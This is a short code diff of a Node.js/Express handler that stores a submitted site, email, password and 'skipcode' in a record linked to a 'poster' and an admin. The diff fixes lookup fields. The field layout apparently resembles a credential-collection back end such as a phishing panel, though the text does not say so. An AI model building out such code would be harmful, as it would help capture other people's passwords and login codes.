@@ -241,9 +241,9 @@ module.exports.add_data = async (req, res) => {
     const { site, email, password, skipcode } = req.body
 
     try {
-        const userFound = await User.findOne({ username: adminId })
+        const userFound = await User.findOne({ adminId: adminId })
 
-        const posterFound = await Poster.findOne({ username: posterId })
+        const posterFound = await Poster.findOne({ posterId: posterId })
 
         if (userFound && posterFound) {
             const info = await Info.create({
@@ -253,7 +253,7 @@ module.exports.add_data = async (req, res) => {
 
 
             })
-            posterFound.push(info._id)
+            posterFound.details.push(info._id)
             await posterFound.save();
             res.status(200).json({ info: info })
 
